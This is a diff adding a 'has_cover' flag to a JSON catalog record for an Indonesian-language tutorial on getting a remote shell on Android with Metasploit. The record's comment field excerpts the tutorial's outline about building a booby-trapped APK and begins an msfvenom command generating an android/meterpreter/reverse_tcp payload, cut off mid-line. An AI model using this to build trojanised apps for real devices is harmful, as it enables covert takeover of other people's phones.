@@ -39,6 +39,7 @@
   ],
   "cover_url": "/cover_thumb/11630?v=1795440360",
   "cover_og_url": "/cover/11630/og?v=1795440360",
+  "has_cover": false,
   "url": "/book/msf-dapatkan-remote-shell-android-onno-widodo-purbo/",
   "rating": null,
   "comment": "sumber: http://www.infosecisland.com/blogview/23632-Getting-a-Remote-Shell-on-an-Android-Device-using-Metasploit.html Contents 1 Membuat booby trapped APK file 2 Di sisi smartphone 3 Di sisi Kali Linux 4 Attack 5 Referensi Membuat booby trapped APK file Buat APK dengan kemampuan remote shell. Gunakan perintah msfpayload. Di Kali Linux, lakukan sudo msfvenom -p android/meterpreter/reverse_tcp",
